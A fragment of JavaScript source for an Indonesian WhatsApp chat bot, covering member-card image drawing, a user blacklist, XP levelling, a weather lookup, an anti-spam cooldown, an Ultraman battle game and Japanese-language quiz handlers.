function generateKodeReg(length = 8) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = 'RYU';

    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    return result;
}

async function generateAnimeCard(user) {
    
    const W = 1080, H = 608;
    const canvas = createCanvas(W, H);
    const ctx = canvas.getContext('2d');

    
    try {
        const bg = await loadImage('./media/idcard_bg.png');
        ctx.drawImage(bg, 0, 0, W, H);
    } catch (e) {
        
        const grad = ctx.createLinearGradient(0, 0, W, H);
        grad.addColorStop(0, '#1a1040');
        grad.addColorStop(1, '#2d1b6b');
        ctx.fillStyle = grad;
        ctx.fillRect(0, 0, W, H);
    }

    
    
    const panelW = 460;
    const panelGrad = ctx.createLinearGradient(0, 0, panelW, 0);
    panelGrad.addColorStop(0,   'rgba(20, 14, 50, 0.82)');
    panelGrad.addColorStop(0.7, 'rgba(30, 20, 65, 0.60)');
    panelGrad.addColorStop(1,   'rgba(30, 20, 65, 0.00)');
    ctx.fillStyle = panelGrad;
    ctx.fillRect(0, 0, panelW + 60, H);

    
    const headerH = 52;
    const headerGrad = ctx.createLinearGradient(0, 0, panelW, 0);
    headerGrad.addColorStop(0,   'rgba(139, 92, 246, 0.90)');  
    headerGrad.addColorStop(0.6, 'rgba(99,  102, 241, 0.75)'); 
    headerGrad.addColorStop(1,   'rgba(99,  102, 241, 0.00)');
    ctx.fillStyle = headerGrad;
    ctx.fillRect(0, 0, panelW + 60, headerH);

    
    const accentGrad = ctx.createLinearGradient(0, 0, panelW, 0);
    accentGrad.addColorStop(0,   'rgba(216, 180, 254, 1)');
    accentGrad.addColorStop(0.5, 'rgba(167, 139, 250, 0.6)');
    accentGrad.addColorStop(1,   'rgba(167, 139, 250, 0)');
    ctx.fillStyle = accentGrad;
    ctx.fillRect(0, headerH, panelW + 60, 2);

    
    ctx.shadowColor = 'rgba(139, 92, 246, 0.8)';
    ctx.shadowBlur  = 12;
    ctx.font        = 'bold 19px "SF Bold"';
    ctx.fillStyle   = '#ffffff';
    ctx.textBaseline = 'middle';
    ctx.fillText('✦  MEMBER CARD  ✦', 24, headerH / 2);
    ctx.shadowBlur = 0;

    
    const stars = [
        { x: 380, y: 80,  r: 3 },
        { x: 420, y: 140, r: 2 },
        { x: 400, y: 200, r: 1.5 },
        { x: 430, y: 300, r: 2.5 },
        { x: 50,  y: 520, r: 2 },
        { x: 100, y: 570, r: 1.5 },
        { x: 410, y: 490, r: 2 },
    ];
    stars.forEach(s => {
        ctx.beginPath();
        ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(216, 180, 254, 0.6)';
        ctx.fill();
    });

    
    const ppX = 50, ppY = 72, ppR = 68;
    ctx.save();
    
    ctx.beginPath();
    ctx.arc(ppX + ppR, ppY + ppR, ppR + 5, 0, Math.PI * 2);
    const ringGrad = ctx.createRadialGradient(
        ppX + ppR, ppY + ppR, ppR - 5,
        ppX + ppR, ppY + ppR, ppR + 6
    );
    ringGrad.addColorStop(0,   'rgba(167, 139, 250, 0.9)');
    ringGrad.addColorStop(0.5, 'rgba(139, 92,  246, 0.5)');
    ringGrad.addColorStop(1,   'rgba(139, 92,  246, 0)');
    ctx.fillStyle = ringGrad;
    ctx.fill();
    
    ctx.beginPath();
    ctx.arc(ppX + ppR, ppY + ppR, ppR, 0, Math.PI * 2);
    ctx.clip();
    try {
        const pp = await loadImage(
            user.ppuser || 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png'
        );
        ctx.drawImage(pp, ppX, ppY, ppR * 2, ppR * 2);
    } catch {
        ctx.fillStyle = '#3b2a7e';
        ctx.fill();
    }
    ctx.restore();
    
    ctx.beginPath();
    ctx.arc(ppX + ppR, ppY + ppR, ppR, 0, Math.PI * 2);
    ctx.lineWidth   = 2.5;
    ctx.strokeStyle = 'rgba(255,255,255,0.85)';
    ctx.stroke();

    
    const fieldX = 50;
    function drawField(label, value, y) {
        
        ctx.font      = '13px "SF Bold"';
        ctx.fillStyle = 'rgba(196, 181, 253, 0.85)';
        ctx.textBaseline = 'top';
        ctx.shadowBlur = 0;
        ctx.fillText(label.toUpperCase(), fieldX, y);

        
        ctx.font      = 'bold 18px "SF Bold"';
        ctx.fillStyle = '#ffffff';
        ctx.shadowColor = 'rgba(139, 92, 246, 0.6)';
        ctx.shadowBlur  = 6;
        ctx.fillText(value, fieldX, y + 17);
        ctx.shadowBlur = 0;

        
        const lineGrad = ctx.createLinearGradient(fieldX, 0, fieldX + 340, 0);
        lineGrad.addColorStop(0,   'rgba(139, 92, 246, 0.7)');
        lineGrad.addColorStop(0.6, 'rgba(99, 102, 241, 0.3)');
        lineGrad.addColorStop(1,   'rgba(99, 102, 241, 0)');
        ctx.fillStyle = lineGrad;
        ctx.fillRect(fieldX, y + 41, 340, 1.5);
    }

    
    const nameX = ppX + ppR * 2 + 18;
    const nameY = ppY + 8;
    ctx.font      = 'bold 22px "SF Bold"';
    ctx.fillStyle = '#f5f3ff';
    ctx.textBaseline = 'top';
    ctx.shadowColor = 'rgba(139, 92, 246, 0.9)';
    ctx.shadowBlur  = 10;
    ctx.fillText(user.nama || 'Unknown', nameX, nameY);
    ctx.shadowBlur = 0;

    
    const status = user.status || 'Free';
    const statusColors = { 'Free': '#a78bfa', 'Premium': '#f59e0b', 'VIP': '#ec4899' };
    ctx.font      = '14px "SF Bold"';
    ctx.fillStyle = statusColors[status] || '#a78bfa';
    ctx.fillText(`✦ ${status} User`, nameX, nameY + 28);

    
    const startY = 220;
    const gap    = 58;

    drawField('Kode Registrasi', user.kodeReg || '-', startY);
    drawField('Tanggal Daftar',  user.daftar_pada || '-', startY + gap);
    drawField('Status Akun',     `${status}  ·  Verified ✓`, startY + gap * 2);
    drawField('Bonus Diterima',  '💳 +30 Limit   💰 +50.000 Coin', startY + gap * 3);

    
    const badgeX = 320, badgeY = 74;
    ctx.beginPath();
    ctx.roundRect(badgeX, badgeY, 100, 26, 13);
    const badgeGrad = ctx.createLinearGradient(badgeX, 0, badgeX + 100, 0);
    badgeGrad.addColorStop(0, 'rgba(139, 92, 246, 0.85)');
    badgeGrad.addColorStop(1, 'rgba(99, 102, 241, 0.70)');
    ctx.fillStyle = badgeGrad;
    ctx.fill();
    ctx.font      = 'bold 12px "SF Bold"';
    ctx.fillStyle = '#ffffff';
    ctx.textBaseline = 'middle';
    ctx.textAlign = 'center';
    ctx.fillText('✔ VERIFIED', badgeX + 50, badgeY + 13);
    ctx.textAlign = 'left';

    
    ctx.font      = '11px "SF Bold"';
    ctx.fillStyle = 'rgba(196, 181, 253, 0.5)';
    ctx.textBaseline = 'bottom';
    ctx.fillText('Alyachan Bot  ·  Powered by Socketon', 24, H - 10);

    
    const vGrad = ctx.createLinearGradient(0, headerH + 4, 0, H - 20);
    vGrad.addColorStop(0,   'rgba(139, 92, 246, 0.9)');
    vGrad.addColorStop(0.5, 'rgba(99, 102, 241, 0.5)');
    vGrad.addColorStop(1,   'rgba(99, 102, 241, 0)');
    ctx.fillStyle = vGrad;
    ctx.fillRect(6, headerH + 4, 3, H - headerH - 24);

    return canvas.toBuffer('image/jpeg', { quality: 0.95 });
}
const blacklistFile = './database/blacklist.json';
if (!fs.existsSync(blacklistFile)) 
    fs.writeFileSync(blacklistFile, JSON.stringify([], null, 2));



let _blacklistCache = null;
try { _blacklistCache = JSON.parse(fs.readFileSync(blacklistFile)); } catch { _blacklistCache = []; }

function getBlacklist() {
    return _blacklistCache;
}

function saveBlacklist(list) {
    _blacklistCache = list; 
    debouncedWrite(blacklistFile, () => list, 3000);
}

function isBlacklisted(sender) {
    return _blacklistCache.some(entry => entry.jid === sender);
}

function getBlacklistReason(sender) {
    const data = _blacklistCache.find(entry => entry.jid === sender);
    return data ? data.reason : "Tidak ada alasan.";
}

function addBlacklist(sender, reason = "Tidak ada alasan.") {
    let list = getBlacklist().slice(); 
    if (!list.some(entry => entry.jid === sender)) {
        list.push({ jid: sender, reason });
        saveBlacklist(list);
    }
}

function removeBlacklist(sender) {
    let list = getBlacklist();
    list = list.filter(entry => entry.jid !== sender);
    saveBlacklist(list);
}
if (isBlacklisted(m.sender) && m.isGroup) {
    try {
        await alya.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });
    } catch (e) {
    }
    return;
}
async function retry(fn, {
  retries = 3,
  delay = 3000
} = {}) {
  let lastErr
  for (let i = 0; i < retries; i++) {
    try {
      return await fn()
    } catch (e) {
      lastErr = e
      if (i < retries - 1)
        await new Promise(r => setTimeout(r, delay))
    }
  }
  throw lastErr
}
function generateReward(type) {
  if (type === 'money') {
    return Math.floor(Math.random() * 150_000) + 50_000
  }
  if (type === 'limit') {
    return Math.floor(Math.random() * 30) + 10
  }
}
function addExp(user, amount) {
    if (!user.exp) user.exp = 0
    if (!user.level) user.level = 1
    if (!user.role) user.role = "Pemula"

    user.exp += amount

    let needed = user.level * 100
    let levelup = false

    while (user.exp >= needed) {
        user.exp -= needed
        user.level++
        levelup = true
        needed = user.level * 100
    }

    if (user.level >= 50) user.role = "Legend"
    else if (user.level >= 35) user.role = "Master"
    else if (user.level >= 25) user.role = "Elite"
    else if (user.level >= 15) user.role = "Pro"
    else if (user.level >= 10) user.role = "Senior"
    else if (user.level >= 5) user.role = "Experienced"

    return levelup
}
if (isCmd) {
 await processXP(m)
}

try {
  const _chatLevelPlugin = require('./plugins/cmd/levelup_chatcount');
  if (typeof _chatLevelPlugin.processChat === 'function') {
    await _chatLevelPlugin.processChat(alya, m);
  }
} catch (_chatLvErr) {
  
}

async function getWeather(city = 'Jakarta') {
    try {
        const geoRes = await axios.get(`https://geocoding-api.open-meteo.com/v1/search?name=${city}&count=1&language=id&format=json`);
        
        if (!geoRes.data.results || geoRes.data.results.length === 0) {
            throw new Error("Kota tidak ditemukan");
        }
        const { latitude, longitude, name, country } = geoRes.data.results[0];
        const weatherRes = await axios.get(`https://api.open-meteo.com/v1/forecast`, {
            params: {
                latitude,
                longitude,
                current_weather: true,
                timezone: 'auto'
            }
        });
        const { temperature, weathercode } = weatherRes.data.current_weather;
        const weatherDesc = parseWMO(weathercode);

        return `${name}, ${country}: ${weatherDesc} (${temperature}°C)`;

    } catch (error) {
        console.error("Weather Error:", error.message);
        return "Informasi cuaca tidak tersedia (28°C)";
    }
}

function parseWMO(code) {
    const codes = {
        0: 'Cerah',
        1: 'Cerah Berawan',
        2: 'Berawan',
        3: 'Mendung',
        45: 'Kabut',
        61: 'Hujan Ringan',
        63: 'Hujan',
        95: 'Badai Petir'
    };
    return codes[code] || 'Berawan';
}
















if (!global.db.settings) global.db.settings = {}
if (botNumber && !global.db.settings[botNumber]) {
    global.db.settings[botNumber] = {}
}
if (typeof global.db.settings[botNumber].antispam === 'undefined') {
    global.db.settings[botNumber].antispam = true;
}
const isAntiSpamActive = global.db.settings[botNumber].antispam;

if (isAntiSpamActive && budy && isAnyPrefix(budy) && !m.isOwner && !Ryuu) {
    const { checkUserCooldown, buildCooldownMessage } = require('./lib/antibanGuard');
    const cdResult = checkUserCooldown(m.sender, command);
    if (!cdResult.allowed) {
        const senderNum = m.sender.split('@')[0];
        const cdMsg = buildCooldownMessage(cdResult, senderNum);
        
        if (cdResult.reason === 'lockdown') return;
        return m.reply(cdMsg, m, { mentions: [m.sender] });
    }
}
const rankOrder = ["High Card", "Pair", "Two Pair", "Three of a Kind", "Straight", "Flush", "Full House", "Four of a Kind", "Straight Flush"];

function checkHand(hand, community) {
  const allCards = [...hand, ...community];
  const counts = {};
  allCards.forEach(c => counts[c.v] = (counts[c.v] || 0) + 1);
  const values = Object.values(counts);

  if (values.includes(4)) return { rank: 7, name: "Four of a Kind" };
  if (values.includes(3) && values.includes(2)) return { rank: 6, name: "Full House" };
  if (values.includes(3)) return { rank: 3, name: "Three of a Kind" };
  if (values.filter(v => v === 2).length >= 2) return { rank: 2, name: "Two Pair" };
  if (values.includes(2)) return { rank: 1, name: "Pair" };
  
  return { rank: 0, name: "High Card" };
}
let user = global.db.users[m.sender]
if (user && user.banned) {
    if (Date.now() > user.bannedTime && user.bannedTime !== 0) {
        user.banned = false
        user.bannedTime = 0
    } else {
        return 
    }
}





const KAIJU_LIST = [
  { name: 'Baltan Seijin',    emoji: '🦞', power: 'Sinar Laser Alien',       reward: 45000  },
  { name: 'Red King',         emoji: '🔴', power: 'Serangan Brutal',           reward: 38000  },
  { name: 'Gomora',           emoji: '🦕', power: 'Tanduk Superoscillation',   reward: 50000  },
  { name: 'Zetton',           emoji: '⚫', power: 'Zetton Shutter',            reward: 90000  },
  { name: 'Eleking',          emoji: '⚡', power: 'Petir Plasma',              reward: 55000  },
  { name: 'Tyrant',           emoji: '👾', power: 'Kekuatan Gabungan',         reward: 80000  },
  { name: 'Bemular',          emoji: '💀', power: 'Blue Sphere',               reward: 35000  },
  { name: 'Dada',             emoji: '🌀', power: 'Telekinesis Alien',         reward: 30000  },
  { name: 'Gatanothor',       emoji: '🕳️', power: 'Kegelapan Mutlak',          reward: 100000 },
  { name: 'Golza',            emoji: '🗻', power: 'Ultrasonic Beam',           reward: 60000  },
  { name: 'Gan-Q',            emoji: '👁️', power: 'Tembakan Mata',             reward: 65000  },
  { name: 'King Joe',         emoji: '🤖', power: 'King Beam',                 reward: 70000  },
  { name: 'Alien Metron',     emoji: '🧬', power: 'Metron Ray',                reward: 55000  },
  { name: 'Bogarl',          emoji: '🐊', power: 'Bogarl Spit',               reward: 48000  },
  { name: 'Lugiel',          emoji: '🖤', power: 'Darkness Shard',             reward: 95000  },
  { name: 'Grigio',          emoji: '🐲', power: 'Grigio Beam',                reward: 42000  },
  { name: 'Gudon',            emoji: '🐍', power: 'Tentacle Whip',             reward: 36000  },
  { name: 'Twintail',        emoji: '🦂', power: 'Twin Stinger',               reward: 37000  },
  { name: 'Jamila',          emoji: '☠️', power: 'Acid Mist',                  reward: 33000  },
  { name: 'Neronga',         emoji: '🐘', power: 'Electric Horn',              reward: 34000  },
  { name: 'Zaragas',         emoji: '🌵', power: 'Cactus Spikes',             reward: 31000  },
  { name: 'Antlar',          emoji: '🦟', power: 'Magnetic Shield',            reward: 39000  },
  { name: 'Magular',         emoji: '🌋', power: 'Underground Smash',         reward: 40000  },
  { name: 'Greenmons',       emoji: '🌿', power: 'Vine Entangle',              reward: 28000  },
  { name: 'Pigmon',          emoji: '🐷', power: 'Camouflage Strike',          reward: 25000  },
  { name: 'Kemur',           emoji: '🦒', power: 'Long Neck Snatch',           reward: 27000  },
  { name: 'Pandon',          emoji: '🔥', power: 'Twin Flame Breath',          reward: 52000  },
  { name: 'Guesra',          emoji: '🦈', power: 'Deep Sea Crush',             reward: 35000  },
  { name: 'Alien Guts',      emoji: '🩸', power: 'Guts Beam',                  reward: 46000  },
  { name: 'Black King',      emoji: '🖤', power: 'Dark Matter Punch',          reward: 68000  },
  { name: 'Seagorath',       emoji: '🌊', power: 'Tidal Crush',               reward: 43000  },
  { name: 'Takong',          emoji: '🐸', power: 'Sonic Roar',                reward: 29000  },
  { name: 'Sartan',          emoji: '🦀', power: 'Claw Barrage',              reward: 32000  },
  { name: 'Yapool',          emoji: '🔮', power: 'Dimensional Rift',           reward: 85000  },
  { name: 'Verokron',        emoji: '🦂', power: 'Scorpion Venom',             reward: 57000  },
  { name: 'Ace Killer',      emoji: '🗡️', power: 'Dark Blade',                 reward: 75000  },
  { name: 'Astromons',       emoji: '🌸', power: 'Petal Barrage',             reward: 41000  },
  { name: 'Birdon',          emoji: '🦅', power: 'Sonic Dive',                reward: 44000  },
  { name: 'Mukadender',      emoji: '🐛', power: 'Centipede Crush',           reward: 38000  },
  { name: 'Alien Magma',     emoji: '🌋', power: 'Magma Stream',              reward: 53000  },
  { name: 'Silly',           emoji: '🎭', power: 'Mind Illusion',             reward: 26000  },
  { name: 'Commander Black', emoji: '🛸', power: 'Black Hole Bomb',           reward: 88000  },
  { name: 'Deathfacer',     emoji: '💀', power: 'Death Ray Burst',            reward: 72000  },
  { name: 'Silvergon',      emoji: '🥈', power: 'Silver Shield Crush',        reward: 61000  },
  { name: 'Zogu',           emoji: '🦋', power: 'Butterfly Devastation',      reward: 92000  },
  { name: 'Chaos Header',   emoji: '⚠️', power: 'Chaos Infection',            reward: 77000  },
  { name: 'Galberos',       emoji: '🐺', power: 'Hell Fang',                  reward: 47000  },
  { name: 'Victory Killer', emoji: '⚔️', power: 'V-Kill Slash',               reward: 82000  },
  { name: 'Five King',      emoji: '👑', power: 'Royal Destruction',          reward: 97000  },
  { name: 'Maga-Orochi',    emoji: '🐉', power: 'Serpent of Origin',          reward: 98000  },
  { name: 'Tregear',        emoji: '😈', power: 'Evil Tiga Spear',            reward: 96000  },
  { name: 'Celebro',        emoji: '🪄', power: 'Parasite Possession',        reward: 94000  },
  { name: 'Greeza',         emoji: '🕳️', power: 'Void Consumption',           reward: 99000  }
];


const ULTRAMAN_IMAGES = {
  
  'Ultraman':         'https://upload.wikimedia.org/wikipedia/en/0/0b/Ultraman_Series_Character_Ultraman.jpg',
  'Ultraseven':       'https://static.wikia.nocookie.net/ultraman/images/4/47/Seven2.png',
  'Ultraman Ace':     'https://static.wikia.nocookie.net/ultraman/images/5/5e/AceProfiler.png',
  'Ultraman Tiga':    'https://static.wikia.nocookie.net/ultraman/images/8/81/TigaProfile.png',
  'Ultraman Dyna':    'https://static.wikia.nocookie.net/ultraman/images/3/3f/DynaProfile.png',
  'Ultraman Gaia':    'https://static.wikia.nocookie.net/ultraman/images/2/2e/GaiaProfile.png',
  'Ultraman Nexus':   'https://static.wikia.nocookie.net/ultraman/images/5/5b/NexusProfile.png',
  'Ultraman Mebius':  'https://static.wikia.nocookie.net/ultraman/images/0/0b/MebiusProfile.png',
  'Ultraman Zero':    'https://static.wikia.nocookie.net/ultraman/images/8/8b/ZeroProfile.png',
  'Ultraman Ginga':   'https://static.wikia.nocookie.net/ultraman/images/4/4f/GingaProfile.png',
  'Ultraman X':       'https://static.wikia.nocookie.net/ultraman/images/f/f1/XProfile.png',
  'Ultraman Orb':     'https://static.wikia.nocookie.net/ultraman/images/4/4e/OrbProfile.png',
  'Ultraman Geed':    'https://static.wikia.nocookie.net/ultraman/images/0/0c/GeedProfile.png',
  'Ultraman R/B':     'https://static.wikia.nocookie.net/ultraman/images/8/8e/RBProfile.png',
  'Ultraman Taiga':   'https://static.wikia.nocookie.net/ultraman/images/4/4d/TaigaProfile.png',
  'Ultraman Z':       'https://static.wikia.nocookie.net/ultraman/images/f/f2/ZedProfile.png',
  'Ultraman Trigger': 'https://static.wikia.nocookie.net/ultraman/images/d/de/TriggerProfile.png',
  'Ultraman Decker':  'https://static.wikia.nocookie.net/ultraman/images/e/e8/DeckerProfile.png',
  
  'Ultraman Belial':      'https://static.wikia.nocookie.net/ultraman/images/0/07/BelialProfile.png',
  'Ultraman Tregear':     'https://static.wikia.nocookie.net/ultraman/images/0/07/TregearProfile.png',
  'Ultraman Noa (Dark)':  'https://static.wikia.nocookie.net/ultraman/images/4/4e/NoahProfile.png',
  'Evil Tiga':            'https://static.wikia.nocookie.net/ultraman/images/d/d3/EvilTigaProfile.png',
  'Imit-Ultraman':        'https://static.wikia.nocookie.net/ultraman/images/0/07/ImitUltramanProfile.png',
  'Dark Lugiel':          'https://static.wikia.nocookie.net/ultraman/images/0/08/LugielProfile.png',
  'Dark Zagi':            'https://static.wikia.nocookie.net/ultraman/images/8/86/ZagiProfile.png',
  'Ultraman Reiga':       'https://static.wikia.nocookie.net/ultraman/images/0/06/ReigaProfile.png',
  'Mold Spectre':         'https://static.wikia.nocookie.net/ultraman/images/5/5d/MoldProfile.png',
  'Absoluto':             'https://static.wikia.nocookie.net/ultraman/images/0/09/AbsolutoProfile.png',
  'Leugocyte':            'https://static.wikia.nocookie.net/ultraman/images/d/d4/LeugocyteProfile.png',
  'Grimdo':               'https://static.wikia.nocookie.net/ultraman/images/4/44/GrimdoProfile.png',
  'Reibatos':             'https://static.wikia.nocookie.net/ultraman/images/0/0b/ReibatoProfile.png',
  'Ultra Dark Killer':    'https://static.wikia.nocookie.net/ultraman/images/f/f1/UltraDarkKillerProfile.png',
  
  '_default': 'https://i.pinimg.com/736x/e2/f6/1c/e2f61cd1b00c88266cfa7a64dac92c52.jpg'
};


function getUltraImg(form) {
  return ULTRAMAN_IMAGES[form] || ULTRAMAN_IMAGES['_default'];
}


async function replyUltraImg(imgUrl, caption) {
  try {
    await alya.sendMessage(m.chat, {
      image: { url: imgUrl },
      caption: caption,
      contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: `${channel}`,
          serverMessageId: Math.floor(Math.random() * 1000) + 1,
          newsletterName: `${channeln}`,
        }
      }
    }, { quoted: m });
  } catch(e) {
    
    replyalya(caption);
  }
}


const ULTRAMAN_TYPES = {
  hero: {
    label: '✨ HERO',
    title: 'Ultraman of Light',
    description: 'Pejuang cahaya pelindung bumi dan semesta',
    forms: ['Ultraman', 'Ultraseven', 'Ultraman Ace', 'Ultraman Tiga', 'Ultraman Dyna', 'Ultraman Gaia', 'Ultraman Nexus', 'Ultraman Mebius', 'Ultraman Zero', 'Ultraman Ginga', 'Ultraman X', 'Ultraman Orb', 'Ultraman Geed', 'Ultraman R/B', 'Ultraman Taiga', 'Ultraman Z', 'Ultraman Trigger', 'Ultraman Decker'],
    color: '🔵',
    attackMoves: ['Specium Ray ⚡', 'Ultra Slash 🌀', 'Strium Beam 🌟', 'Zepellion Ray 💫', 'Wide Shot ✨', 'Meta Field 🌐', 'Glitter Zepellion Ray 🌈']
  },
  villain: {
    label: '😈 VILLAIN',
    title: 'Dark Ultra',
    description: 'Ultraman kegelapan yang haus kekuatan',
    forms: ['Ultraman Belial', 'Ultraman Tregear', 'Ultraman Noa (Dark)', 'Evil Tiga', 'Imit-Ultraman', 'Dark Lugiel', 'Dark Zagi', 'Ultraman Reiga', 'Mold Spectre', 'Absoluto', 'Leugocyte', 'Grimdo', 'Reibatos', 'Ultra Dark Killer'],
    color: '🔴',
    attackMoves: ['Dark Field 🖤', 'Kaiser Darkness Blade ⚔️', 'Deathcium Ray ☠️', 'Evil Tiga Spear 🔱', 'Dark Lucifer ⛧', 'Vile Spear of Darkness 🗡️', 'Belial Atrocious 💥']
  }
};


const ULTRAMAN_DB_PATH = './database/ultraman.json';
function loadUltramanDB() {
  try {
    if (!fs.existsSync(ULTRAMAN_DB_PATH)) fs.writeFileSync(ULTRAMAN_DB_PATH, '{}');
    return JSON.parse(fs.readFileSync(ULTRAMAN_DB_PATH, 'utf-8'));
  } catch { return {}; }
}
function saveUltramanDB(data) {
  fs.writeFileSync(ULTRAMAN_DB_PATH, JSON.stringify(data, null, 2));
}
function getUltraData(jid) {
  const db = loadUltramanDB();
  return db[jid] || null;
}
function setUltraData(jid, data) {
  const db = loadUltramanDB();
  db[jid] = data;
  saveUltramanDB(db);
}
function getRandomKaiju() {
  return KAIJU_LIST[Math.floor(Math.random() * KAIJU_LIST.length)];
}
function getRandomForm(type) {
  const forms = ULTRAMAN_TYPES[type].forms;
  return forms[Math.floor(Math.random() * forms.length)];
}
function getRandomAttack(type) {
  const moves = ULTRAMAN_TYPES[type].attackMoves;
  return moves[Math.floor(Math.random() * moves.length)];
}
function formatHPBar(hp, max = 100) {
  const filled = Math.round((hp / max) * 10);
  const empty = 10 - filled;
  return '█'.repeat(Math.max(0, filled)) + '░'.repeat(Math.max(0, empty));
}





{
  
  const _kursusUser = _kursusGetUser ? _kursusGetUser(m.sender) : null
  if (
    _kursusUser &&
    _kursusUser.status === 'ngerjain_soal' &&
    alya._soalSession &&
    alya._soalSession[m.sender] &&
    alya._soalSession[m.sender].chatId === m.chat &&
    !m.key.fromMe
  ) {
    const _ctx2 = { ...ctx, sender: m.sender, budy, replyalya, reply }
    const _handled = await _handleJawaban(alya, m, _ctx2)
    if (_handled) { kuis = true }
  }
}





alya.tebakhiragana = alya.tebakhiragana ? alya.tebakhiragana : {}
if (id in alya.tebakhiragana && !m.key.fromMe) {
  let users = global.db.users[m.sender]
  let json = alya.tebakhiragana[id][1]
  kuis = true
  if (budy.toLowerCase().trim() === json.romaji.toLowerCase()) {
    let moneyHadiah = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000
    let expHadiah = Math.floor(Math.random() * (5000 - 500 + 1)) + 500
    users.money += moneyHadiah
    users.exp += expHadiah
    replyalya(`🎉 *BENAR!* 素晴らしい！\n\n` +
      `Huruf: *${json.huruf}*\n` +
      `Bacaan: *${json.romaji}*\n\n` +
      `💰 Hadiah: +${moneyHadiah.toLocaleString()} Money\n` +
      `⭐ Exp: +${expHadiah.toLocaleString()} EXP\n\n` +
      `_Terus semangat belajar bahasa Jepang! がんばって！_`)
    clearTimeout(alya.tebakhiragana[id][2])
    delete alya.tebakhiragana[id]
  } else if (/nyerah|angkat tangan/i.test(budy)) {
    replyalya(`💢 Menyerah ya~\nJawaban yang benar: *${json.romaji}*\n\nCoba lagi ketik *.tebakhiragana*`)
    clearTimeout(alya.tebakhiragana[id][2])
    delete alya.tebakhiragana[id]
  }
}


alya.tebakkatakana = alya.tebakkatakana ? alya.tebakkatakana : {}
if (id in alya.tebakkatakana && !m.key.fromMe) {
  let users = global.db.users[m.sender]
  let json = alya.tebakkatakana[id][1]
  kuis = true
  if (budy.toLowerCase().trim() === json.romaji.toLowerCase()) {
    let moneyHadiah = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000
    let expHadiah = Math.floor(Math.random() * (5000 - 500 + 1)) + 500
    users.money += moneyHadiah
    users.exp += expHadiah
    replyalya(`🎉 *BENAR!* 素晴らしい！\n\n` +
      `Huruf: *${json.huruf}*\n` +
      `Bacaan: *${json.romaji}*\n\n` +
      `💰 Hadiah: +${moneyHadiah.toLocaleString()} Money\n` +
      `⭐ Exp: +${expHadiah.toLocaleString()} EXP\n\n` +
      `_Terus semangat belajar bahasa Jepang! がんばって！_`)
    clearTimeout(alya.tebakkatakana[id][2])
    delete alya.tebakkatakana[id]
  } else if (/nyerah|angkat tangan/i.test(budy)) {
    replyalya(`💢 Menyerah ya~\nJawaban yang benar: *${json.romaji}*\n\nCoba lagi ketik *.tebakkatakana*`)
    clearTimeout(alya.tebakkatakana[id][2])
    delete alya.tebakkatakana[id]
  }
}


alya.tebakkanji = alya.tebakkanji ? alya.tebakkanji : {}
if (id in alya.tebakkanji && !m.key.fromMe) {
  let users = global.db.users[m.sender]
  let json = alya.tebakkanji[id][1]
  kuis = true
  const jawabanUser = budy.toLowerCase().trim()
  const jawabanBenar = json.arti.toLowerCase()
  const isBenar = jawabanUser === jawabanBenar || json.arti.toLowerCase().split('/').map(a => a.trim()).some(a => a === jawabanUser)
  if (isBenar) {
    let moneyHadiah = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000
    let expHadiah = Math.floor(Math.random() * (5000 - 500 + 1)) + 500
    users.money += moneyHadiah
    users.exp += expHadiah
    replyalya(`🎉 *BENAR!* よくできました！\n\n` +
      `Kanji: *${json.kanji}*\n` +
      `Bacaan: *${json.bacaan}*\n` +
      `Arti: *${json.arti}*\n\n` +
      `💰 Hadiah: +${moneyHadiah.toLocaleString()} Money\n` +
      `⭐ Exp: +${expHadiah.toLocaleString()} EXP\n\n` +
      `_Kanji master! がんばって！_`)
    clearTimeout(alya.tebakkanji[id][2])
    delete alya.tebakkanji[id]
  } else if (/nyerah|angkat tangan/i.test(budy)) {
    replyalya(`💢 Menyerah ya~\nJawaban yang benar: *${json.arti}*\n(Bacaan: ${json.bacaan})\n\nCoba lagi ketik *.tebakkanji*`)
    clearTimeout(alya.tebakkanji[id][2])
    delete alya.tebakkanji[id]
  }
}


alya.soalbahasajepang = alya.soalbahasajepang ? alya.soalbahasajepang : {}
if (id in alya.soalbahasajepang && !m.key.fromMe) {
  let users = global.db.users[m.sender]
  let data = alya.soalbahasajepang[id]
  let json = data[1]
  kuis = true
  const jawabanUser = budy.toUpperCase().trim()
  if (['A','B','C','D','E'].includes(jawabanUser)) {
    if (jawabanUser === json.jawaban) {
      let moneyHadiah = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000
      let expHadiah = Math.floor(Math.random() * (5000 - 500 + 1)) + 500
      users.money += moneyHadiah
      users.exp += expHadiah
      replyalya(`🎉 *BENAR!* Pilihan ${jawabanUser} tepat!\n\n` +
        `📝 *Penjelasan:*\n${json.penjelasan}\n\n` +
        `💰 Hadiah: +${moneyHadiah.toLocaleString()} Money\n` +
        `⭐ Exp: +${expHadiah.toLocaleString()} EXP\n\n` +
        `_Terus belajar bahasa Jepang! がんばって！_`)
      clearTimeout(alya.soalbahasajepang[id][2])
      delete alya.soalbahasajepang[id]
    } else {
      replyalya(`❌ *SALAH!* Jawaban kamu: ${jawabanUser}\n\n` +
        `📚 Jawaban yang benar: *${json.jawaban}*\n` +
        `📝 *Penjelasan:*\n${json.penjelasan}\n\n` +
        `_Yuk belajar lagi! Ketik *.soalbahasajepang* untuk soal baru_ 🎌`)
      clearTimeout(alya.soalbahasajepang[id][2])
      delete alya.soalbahasajepang[id]
    }
  }
}


















if (m.isGroup && alya.duel && alya.duel[m.chat]) {
  const _duelSession = alya.duel[m.chat];
  const _isDuelParticipant = m.sender === _duelSession.p1 || m.sender === _duelSession.p2;

  
  
  
  
  
  if (_isDuelParticipant && !isCmd) {
    try {
      const _duelPlugin = require('./plugins/cmd/duel.js');
      if (_duelPlugin && typeof _duelPlugin.run === 'function') {
        const _duelCtx = {
          command, args, text, prefix,
          reply, replyalya, replytolak,
          sender, pushname, isGroup,
          Ryuu, resolveTarget,
        };
